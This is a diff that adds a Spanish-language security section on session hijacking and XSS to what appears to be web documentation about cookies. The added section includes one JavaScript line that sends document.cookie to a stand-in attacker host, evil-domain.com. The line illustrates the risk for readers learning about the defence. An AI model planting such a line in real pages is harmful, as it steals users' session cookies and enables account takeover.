@@ -82,3 +82,14 @@ document.cookie = "tasty_cookie=strawberry";
 console.log(document.cookie);
 // logs "yummy_cookie=choco; tasty_cookie=strawberry"
 ````
+
+
+### Seguridad
+
+#### Session hijacking y XSS
+
+Las cookies se utilizan a menudo en la aplicación web ara identificar a un usuario y su sesión autenticada. Robar una cookie puede llevar a robar la sesion de algún usuario autenticado.
+
+`
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+`
